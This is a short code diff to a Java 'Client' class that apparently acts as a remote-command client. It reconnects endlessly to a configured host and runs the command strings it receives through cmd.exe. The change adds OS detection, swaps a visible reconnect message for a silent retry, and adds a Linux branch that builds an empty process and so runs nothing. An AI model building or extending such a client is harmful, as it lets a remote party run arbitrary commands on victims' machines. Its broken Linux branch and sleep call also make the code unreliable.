@@ -13,7 +13,7 @@ public class Client {
     private DataOutputStream dos;
     private File directory;
     private DataInputStream dis;
-
+    private String SYSTEMOS = System.getProperty("os.name");
 
     private static String getHOST() {
         return HOST;
@@ -90,7 +90,7 @@ public class Client {
             }
         } catch (Exception e) {
             /* Continually retry connection until established. */
-            System.out.println("Attempting to reconnect...");
+            Thread.sleep(1000);
             connect();
         }
     }
@@ -116,7 +116,12 @@ public class Client {
     private void exec(String command) {
         if (!command.equals("")) {
             try {
-                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
+                ProcessBuilder pb = null;
+                if(SYSTEMOS.contains("Windows")) {
+                    pb = new ProcessBuilder("cmd.exe", "/c", command);
+                } else if (SYSTEMOS.contains("Linux")){
+                    pb = new ProcessBuilder();
+                }
                 pb.redirectErrorStream(true);
                 Process proc = pb.start();
                 try {
